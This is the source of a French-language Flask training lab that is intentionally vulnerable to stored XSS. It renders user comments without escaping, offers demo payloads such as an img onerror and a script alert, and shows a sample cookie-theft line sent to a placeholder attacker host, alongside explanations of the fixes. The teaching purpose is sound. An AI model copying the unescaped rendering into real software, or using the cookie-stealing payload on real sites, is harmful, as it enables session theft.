"""
XSS Lab — Vulnerable Version
⚠️ INTENTIONALLY VULNERABLE — EDUCATIONAL USE ONLY
CWE-79 | OWASP A03:2021
"""
from __future__ import annotations
import os
from typing import Any
from flask import Flask, jsonify, request

app = Flask(__name__)
app.secret_key = "lab-xss-vuln-key"
_comments: list[dict[str, str]] = []

FA = '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">'

CSS = """
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh}
.banner{padding:12px 24px;display:flex;align-items:center;gap:10px;font-weight:600;font-size:.95em;background:#da3633}
.container{max-width:1100px;margin:0 auto;padding:20px}
h1{font-size:1.4em;margin-bottom:4px}h2{font-size:1.1em;margin:14px 0 8px;color:#58a6ff;border-left:3px solid #58a6ff;padding-left:8px}
.meta{color:#8b949e;font-size:.85em;margin-bottom:16px}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:.75em;font-weight:600;margin-right:4px}
.badge-cwe{background:#1a1f2e;border:1px solid #30363d;color:#8b949e}
.badge-owasp{background:#0d2145;border:1px solid #1f6feb;color:#58a6ff}
.badge-red{background:#4a0d0d;border:1px solid #da3633;color:#f85149}
.tabs{display:flex;border-bottom:2px solid #21262d;margin-bottom:18px}
.tab-btn{padding:9px 18px;background:none;border:none;color:#8b949e;cursor:pointer;font-size:.88em;border-bottom:2px solid transparent;margin-bottom:-2px}
.tab-btn:hover{color:#e6edf3}.tab-btn.active{color:#58a6ff;border-bottom-color:#58a6ff;font-weight:600}
.tab-pane{display:none}.tab-pane.active{display:block}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px;margin-bottom:14px}
.fg{margin-bottom:10px}.fg label{display:block;font-size:.82em;color:#8b949e;margin-bottom:3px}
.fg input,.fg textarea{width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:5px;color:#e6edf3;font-size:.88em;font-family:inherit}
.fg textarea{height:70px;resize:vertical}
.btn{padding:9px 18px;border-radius:5px;cursor:pointer;font-size:.88em;font-weight:600;border:none;margin-right:6px}
.btn:hover{opacity:.85}.btn-red{background:#da3633;color:#fff}.btn-gray{background:#21262d;border:1px solid #30363d;color:#e6edf3}
.code{background:#0d1117;border:1px solid #30363d;border-left:3px solid #da3633;border-radius:5px;padding:12px;font-family:'Courier New',monospace;font-size:.8em;line-height:1.6;overflow-x:auto;margin:6px 0;white-space:pre-wrap}
.code.good{border-left-color:#3fb950}
.box{border-radius:6px;padding:11px 14px;font-size:.85em;margin:8px 0;line-height:1.5}
.box.danger{background:#4a0d0d;border:1px solid #da3633;color:#f85149}
.box.warn{background:#3d1f00;border:1px solid #d29922;color:#d29922}
.box.info{background:#0d2145;border:1px solid #1f6feb;color:#58a6ff}
.box.success{background:#0d4a1e;border:1px solid #238636;color:#3fb950}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.gd{display:grid;grid-template-columns:260px 1fr;gap:14px}
@media(max-width:660px){.g2,.gd{grid-template-columns:1fr}}
.pl{background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:10px;margin-bottom:8px}
.pl .lbl{font-size:.75em;color:#58a6ff;font-weight:700;margin-bottom:3px}
.pl .cd{font-family:monospace;font-size:.78em;word-break:break-all;margin-bottom:4px}
.pl .desc{font-size:.77em;color:#8b949e;margin-bottom:5px}
.result{background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:12px;margin-top:10px;min-height:60px}
.ci{border:1px solid #21262d;border-radius:4px;padding:8px;margin-bottom:6px}
.ci .nm{font-size:.78em;font-weight:700;color:#58a6ff}
.ci .bd{font-size:.85em;margin-top:2px}
table{width:100%;border-collapse:collapse;font-size:.82em}
th,td{padding:7px 10px;border:1px solid #21262d;text-align:left}
th{background:#161b22;color:#8b949e}
code{background:#0d1117;padding:1px 4px;border-radius:2px;font-size:.85em;font-family:monospace}
p{margin-bottom:6px;line-height:1.55;font-size:.88em;color:#8b949e}
ul{padding-left:18px;color:#8b949e;font-size:.88em;line-height:1.9}
"""

PAGE = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSS Lab — Vulnérable</title>
{FA}
<style>{CSS}</style>
</head>
<body>
<div class="banner">
  <i class="fa-solid fa-triangle-exclamation"></i>
  XSS LAB — VULNÉRABLE
  <span>| Cross-Site Scripting | CWE-79 | OWASP A03:2021 | Version sécurisée : localhost:5002</span>
</div>
<div class="container">
<h1>Cross-Site Scripting (XSS)</h1>
<div class="meta">
  <span class="badge badge-red">Vulnérable</span>
  <span class="badge badge-cwe">CWE-79</span>
  <span class="badge badge-owasp">OWASP A03:2021</span>
</div>
<div class="tabs">
  <button class="tab-btn active" onclick="showTab('demo',this)"><i class="fa-solid fa-flask"></i> Démonstration</button>
  <button class="tab-btn" onclick="showTab('theory',this)"><i class="fa-solid fa-book"></i> Théorie</button>
  <button class="tab-btn" onclick="showTab('code',this)"><i class="fa-solid fa-code"></i> Code</button>
  <button class="tab-btn" onclick="showTab('fix',this)"><i class="fa-solid fa-shield-halved"></i> Correction</button>
</div>

<div id="tab-demo" class="tab-pane active">
<div class="gd">
<div>
<div class="card">
<h2><i class="fa-solid fa-crosshairs"></i> Payloads</h2>
<div class="box warn"><i class="fa-solid fa-triangle-exclamation"></i> Ces payloads <strong>s'exécutent réellement</strong> dans votre navigateur.</div>
<div class="pl">
  <div class="lbl">Payload 1 — Modification du DOM</div>
  <div class="cd">&lt;img src=x onerror="document.title='XSS_PWNED'"&gt;</div>
  <div class="desc">L'événement <code>onerror</code> exécute du JS. Regardez le titre de l'onglet changer.</div>
  <button class="btn btn-gray" onclick="fillP('Alice','&lt;img src=x onerror=\\'document.title=\\\"XSS_PWNED\\\"\\'&gt;')"><i class="fa-solid fa-play"></i> Essayer</button>
</div>
<div class="pl">
  <div class="lbl">Payload 2 — Injection HTML stylée</div>
  <div class="cd">&lt;b style="color:red;font-size:26px"&gt;INJECTION DÉTECTÉE&lt;/b&gt;</div>
  <div class="desc">Balise HTML rendue directement. La mise en forme est appliquée.</div>
  <button class="btn btn-gray" onclick="fillP('Bob','&lt;b style=\\'color:red;font-size:26px\\'&gt;INJECTION DÉTECTÉE&lt;/b&gt;')"><i class="fa-solid fa-play"></i> Essayer</button>
</div>
<div class="pl">
  <div class="lbl">Payload 3 — Script inline</div>
  <div class="cd">&lt;script&gt;alert('XSS lab — 10 pts')&lt;/script&gt;</div>
  <div class="desc">Balise <code>&lt;script&gt;</code> injectée. Ouvrir la console F12.</div>
  <button class="btn btn-gray" onclick="fillP('Eve','&lt;script&gt;alert(\\'XSS lab — 10 pts\\')&lt;/script&gt;')"><i class="fa-solid fa-play"></i> Essayer</button>
</div>
<div class="pl">
  <div class="lbl">Référence — Texte normal</div>
  <div class="cd">Bonjour, beau lab !</div>
  <div class="desc">Entrée saine. Aucun comportement inattendu.</div>
  <button class="btn btn-gray" onclick="fillP('Alice','Bonjour, beau lab !')"><i class="fa-solid fa-play"></i> Essayer</button>
</div>
</div>
</div>
<div>
<div class="card">
<h2><i class="fa-solid fa-comment"></i> Tableau de commentaires</h2>
<div class="box danger"><i class="fa-solid fa-triangle-exclamation"></i> Le contenu HTML est rendu <strong>sans aucun échappement</strong>. Les scripts s'exécutent.</div>
<div class="fg"><label>Nom</label><input id="fn" placeholder="Votre nom"></div>
<div class="fg"><label>Commentaire (injectez un payload ici)</label><textarea id="fc" placeholder="Collez ou écrivez un payload XSS..."></textarea></div>
<button class="btn btn-red" onclick="postComment()"><i class="fa-solid fa-paper-plane"></i> Publier</button>
<button class="btn btn-gray" onclick="clearAll()"><i class="fa-solid fa-trash"></i> Effacer</button>
</div>
<div class="result">
<h4 style="color:#8b949e;font-size:.82em;margin-bottom:8px"><i class="fa-solid fa-comments"></i> Commentaires — HTML rendu sans protection</h4>
<div id="output"><p style="color:#6e7681;font-size:.82em">Aucun commentaire.</p></div>
</div>
<div class="box info" style="margin-top:10px">
  <i class="fa-solid fa-magnifying-glass"></i>
  Ouvrez la <strong>console développeur (F12)</strong> pour voir les scripts s'exécuter.
  Observez le <strong>titre de l'onglet</strong> après le Payload 1.
</div>
</div>
</div>
</div>

<div id="tab-theory" class="tab-pane">
<div class="g2">
<div>
<div class="card">
<h2><i class="fa-solid fa-circle-question"></i> Qu'est-ce que le XSS ?</h2>
<p>Le <strong>Cross-Site Scripting (XSS)</strong> est une vulnérabilité d'injection où du code JavaScript malveillant est inséré dans une page web et exécuté dans le navigateur d'un autre utilisateur.</p>
<p>Cause fondamentale : l'application affiche des données utilisateur dans le HTML <strong>sans les encoder</strong>. Le navigateur interprète les données comme du code.</p>
<h2><i class="fa-solid fa-diagram-project"></i> Fonctionnement étape par étape</h2>
<div class="code bad">Étape 1 — Attaquant soumet :
  &lt;script&gt;document.location='http://attacker/?c='+document.cookie&lt;/script&gt;

Étape 2 — Serveur stocke et retransmet :
  &lt;p&gt;&lt;script&gt;...&lt;/script&gt;&lt;/p&gt;

Étape 3 — Navigateur victime exécute le script
Résultat : cookie envoyé à l'attaquant → session volée</div>
<h2><i class="fa-solid fa-list"></i> Types de XSS</h2>
<table>
  <tr><th>Type</th><th>Vecteur</th><th>Persistance</th></tr>
  <tr><td><strong>Stocké</strong></td><td>Formulaire → BDD</td><td>Permanent (ce lab)</td></tr>
  <tr><td><strong>Réfléchi</strong></td><td>URL → réponse</td><td>Immédiat</td></tr>
  <tr><td><strong>DOM-based</strong></td><td>JS côté client</td><td>Côté client</td></tr>
</table>
</div>
</div>
<div>
<div class="card">
<h2><i class="fa-solid fa-bolt"></i> Impact réel</h2>
<div class="box danger">
  <ul>
    <li>Vol de cookies de session</li>
    <li>Phishing intégré dans la page légitime</li>
    <li>Keylogging (capture clavier)</li>
    <li>Redirection vers un site malveillant</li>
    <li>Défacement de page</li>
    <li>Prise de contrôle du compte</li>
  </ul>
</div>
<h2><i class="fa-solid fa-exclamation"></i> Pourquoi cette faille existe</h2>
<p>L'erreur est de confondre <strong>données</strong> et <strong>code</strong>.</p>
<div class="code bad"><span style="color:#f85149"># MAUVAIS — f-string non sécurisée</span>
return f"&lt;p&gt;Bonjour {{user_input}}&lt;/p&gt;"
<span style="color:#6e7681"># user_input = "&lt;script&gt;alert(1)&lt;/script&gt;"
# → &lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;  ← EXÉCUTÉ</span><button id="lang-btn" onclick="toggleLang()" style="margin-left:auto;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.4);color:#fff;padding:4px 12px;border-radius:4px;cursor:pointer;font-size:.8em;font-weight:600">EN</button></div>
<h2><i class="fa-solid fa-book-open"></i> Références</h2>
<div class="box info">
  <div>CWE-79 — Improper Neutralization of Input During Web Page Generation</div>
  <div>OWASP Top 10 A03:2021 — Injection</div>
  <div>OWASP XSS Prevention Cheat Sheet</div>
</div>
</div>
</div>
</div>
</div>

<div id="tab-code" class="tab-pane">
<div class="g2">
<div>
<div class="card">
<h2 style="color:#f85149"><i class="fa-solid fa-triangle-exclamation"></i> Code vulnérable (ici)</h2>
<div class="code bad"><span style="color:#6e7681"># Cette page — rendu HTML brut</span>
def _render_comments(comments):
    parts = []
    for c in comments:
        parts.append(
            '&lt;div class="ci"&gt;'
            <span style="color:#ffa8a8">f'&lt;div&gt;{{c["name"]}}&lt;/div&gt;'</span>
            <span style="color:#ffa8a8">f'&lt;div&gt;{{c["comment"]}}&lt;/div&gt;'</span>
            '&lt;/div&gt;'
        )
    return "".join(parts)

<span style="color:#f85149"># ⚠ Si comment = "&lt;script&gt;alert(1)&lt;/script&gt;"
# Le navigateur reçoit et EXÉCUTE le script</span></div>
</div>
</div>
<div>
<div class="card">
<h2 style="color:#3fb950"><i class="fa-solid fa-circle-check"></i> Code sécurisé (localhost:5002)</h2>
<div class="code good"><span style="color:#6e7681"># Jinja2 auto-escaping — activé par défaut</span>
<span style="color:#6e7681"># Template Jinja2 :</span>
&lt;div&gt;<span style="color:#89f0a0">{{ comment }}</span>&lt;/div&gt;
<span style="color:#6e7681"># Jinja2 encode automatiquement :
#   &lt;  →  &amp;lt;
#   &gt;  →  &amp;gt;
#   "  →  &amp;quot;

# Input : &lt;script&gt;alert(1)&lt;/script&gt;
# Output : &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
# → Affiché comme TEXTE, jamais exécuté</span>

<span style="color:#6e7681"># + Content-Security-Policy :</span>
resp.headers["Content-Security-Policy"] = <span style="color:#89f0a0">"script-src 'none';"</span></div>
</div>
</div>
</div>
</div>

<div id="tab-fix" class="tab-pane">
<div class="g2">
<div>
<div class="card">
<h2><i class="fa-solid fa-shield-halved"></i> Comment corriger</h2>
<h2>1. Encodage de sortie (priorité 1)</h2>
<div class="code good"><span style="color:#6e7681"># Jinja2 (auto-escape ON par défaut)</span>
&lt;p&gt;<span style="color:#89f0a0">{{ user_input }}</span>&lt;/p&gt;

<span style="color:#6e7681"># Python explicit :</span>
from markupsafe import escape
safe = <span style="color:#89f0a0">escape(user_input)</span></div>
<h2>2. Content-Security-Policy</h2>
<div class="code good">Content-Security-Policy: <span style="color:#89f0a0">script-src 'none'</span></div>
<h2>3. HttpOnly Cookie</h2>
<div class="code good">Set-Cookie: session=xxx; <span style="color:#89f0a0">HttpOnly; Secure; SameSite=Strict</span>
<span style="color:#6e7681"># Inaccessible depuis document.cookie</span></div>
<h2>4. Validation d'entrée (défense en profondeur)</h2>
<div class="code good">import re
<span style="color:#89f0a0">pattern = re.compile(r'^[\w\s\-\.,!?]{{1,500}}$')</span>
if not pattern.match(comment):
    return error("Caractères non autorisés")</div>
</div>
</div>
<div>
<div class="card">
<h2><i class="fa-solid fa-arrows-left-right"></i> Comparaison</h2>
<table>
  <tr><th>Aspect</th><th style="color:#f85149">Vulnérable</th><th style="color:#3fb950">Sécurisé</th></tr>
  <tr><td>Rendu HTML</td><td style="color:#f85149">Brut</td><td style="color:#3fb950">Encodé (HTML entities)</td></tr>
  <tr><td><code>&lt;script&gt;</code></td><td style="color:#f85149">Exécuté</td><td style="color:#3fb950">Texte &amp;lt;script&amp;gt;</td></tr>
  <tr><td>onerror=</td><td style="color:#f85149">Exécuté</td><td style="color:#3fb950">Attribut encodé</td></tr>
  <tr><td>CSP</td><td style="color:#f85149">Absent</td><td style="color:#3fb950">script-src 'none'</td></tr>
  <tr><td>Validation</td><td style="color:#f85149">Aucune</td><td style="color:#3fb950">Allowlist chars</td></tr>
</table>
<div class="box success" style="margin-top:12px">
  <i class="fa-solid fa-circle-right"></i>
  Testez <a href="http://localhost:5002" style="color:#3fb950">localhost:5002</a>
  avec les mêmes payloads — tout s'affiche comme texte brut.
</div>
</div>
</div>
</div>
</div>

</div>
<script>
function showTab(n,b){{document.querySelectorAll('.tab-pane').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active'));document.getElementById('tab-'+n).classList.add('active');if(b)b.classList.add('active');}}
function fillP(name,comment){{document.getElementById('fn').value=name;document.getElementById('fc').value=comment;}}
function postComment(){{
  const name=document.getElementById('fn').value;
  const comment=document.getElementById('fc').value;
  if(!name||!comment)return;
  fetch('/api/comment',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{name,comment}})}}).then(()=>loadComments());
}}
function clearAll(){{fetch('/clear').then(()=>{{document.getElementById('output').innerHTML='<p style="color:#6e7681;font-size:.82em">Effacé.</p>';}});}}
function loadComments(){{
  fetch('/api/comments').then(r=>r.json()).then(data=>{{
    const d=document.getElementById('output');
    if(!data.length){{d.innerHTML='<p style="color:#6e7681;font-size:.82em">Aucun commentaire.</p>';return;}}
    d.innerHTML=data.map(c=>`<div class="ci"><div class="nm">${{c.name}}</div><div class="bd">${{c.comment}}</div></div>`).join('');
  }});
}}
loadComments();

var LANG='fr';var TXT={{fr:{{demo:'Démonstration',theory:'Théorie',code:'Code',fix:'Correction',langLabel:'EN'}},en:{{demo:'Demonstration',theory:'Theory',code:'Code',fix:'Defense',langLabel:'FR'}}}};
function toggleLang(){{LANG=LANG==='fr'?'en':'fr';var b=document.getElementById('lang-btn');if(b)b.textContent=TXT[LANG].langLabel;document.querySelectorAll('.tb').forEach(function(el){{var oc=el.getAttribute('onclick')||'';var key=null;if(oc.indexOf("'demo'")>=0)key='demo';else if(oc.indexOf("'theory'")>=0)key='theory';else if(oc.indexOf("'code'")>=0)key='code';else if(oc.indexOf("'fix'")>=0)key='fix';if(key&&TXT[LANG][key]){{el.childNodes.forEach(function(n){{if(n.nodeType===3&&n.textContent.trim()){{n.textContent=' '+TXT[LANG][key];}}); }} }}); }}
function setPayload(btn){{var u=btn.getAttribute('data-u');var p=btn.getAttribute('data-p');var v=btn.getAttribute('data-v');if(document.getElementById('fu')&&u!==null)document.getElementById('fu').value=u;if(document.getElementById('fp')&&p!==null)document.getElementById('fp').value=p;if(document.getElementById('fname')&&v!==null)document.getElementById('fname').value=v;if(document.getElementById('ft')&&v!==null)document.getElementById('ft').value=v;if(typeof updatePreview==='function')updatePreview();if(typeof updateQ==='function')updateQ();}}
</script>
</body></html>"""


@app.route("/", methods=["GET"])
def index() -> Any:
    return PAGE


@app.route("/api/comment", methods=["POST"])
def api_add() -> Any:
    data = request.get_json(force=True, silent=True) or {}
    _comments.append({"name": str(data.get("name", "")), "comment": str(data.get("comment", ""))})
    return jsonify({"status": "ok", "total": len(_comments)})


@app.route("/api/comments", methods=["GET"])
def api_comments() -> Any:
    return jsonify(_comments)


@app.route("/api/last", methods=["GET"])
def api_last() -> Any:
    if _comments:
        return jsonify(_comments[-1])
    return jsonify({}), 404


@app.route("/clear")
def clear() -> Any:
    _comments.clear()
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
